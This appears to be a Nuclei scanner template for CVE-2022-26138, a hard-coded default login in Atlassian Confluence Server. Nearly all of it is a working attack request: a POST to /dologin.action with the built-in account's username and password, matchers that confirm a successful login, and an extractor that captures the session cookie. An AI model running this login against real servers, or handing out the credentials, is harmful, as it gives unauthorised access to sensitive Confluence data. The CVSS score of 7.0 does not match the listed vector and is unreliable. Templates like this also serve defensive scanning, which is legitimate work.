id: cve-2022-26138
info:
  name: Atlassian Confluence Default Login
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Atlassian Confluence Server is vulnerable due to the use of hard-coded passwords that allow attackers to log in and view sensitive information such as team space members.
  reference:
    - https://jira.atlassian.com/browse/CONFSERVER-79483
    - https://github.com/projectdiscovery/nuclei-templates/pull/4889/files
  classification:
    cve-id: CVE-2022-26138
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.0
  tags: default-password
http:
  - raw:
      - |
        POST /dologin.action HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{BaseURL}}/login.action?logout=true
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1

        os_username=disabledsystemuser&os_password=disabled1system1user6708&login=%E7%99%BB%E5%BD%95&os_destination=
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: header
        words:
          - "/httpvoid.action"
      - type: word
        part: header
        words:
          - "Location:"
    extractors:
      - type: kval
        kval:
          - JSESSIONID
